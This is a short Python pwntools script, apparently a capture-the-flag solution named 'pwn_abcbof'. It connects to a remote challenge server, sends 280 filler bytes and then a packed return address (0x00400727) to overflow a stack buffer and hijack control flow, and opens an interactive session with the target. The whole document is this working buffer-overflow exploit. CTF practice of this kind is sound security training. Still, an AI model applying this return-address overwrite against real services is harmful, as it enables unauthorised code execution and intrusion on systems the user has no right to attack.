#pwn_abcbof
from pwn import *

conn=remote("chals20.cybercastors.com",14424)
buf="a"*280
#conn.sendline(" ")
payload=p64(0x00400727)
out=buf+payload
conn.sendline(out)
conn.interactive()
print conn.recv()
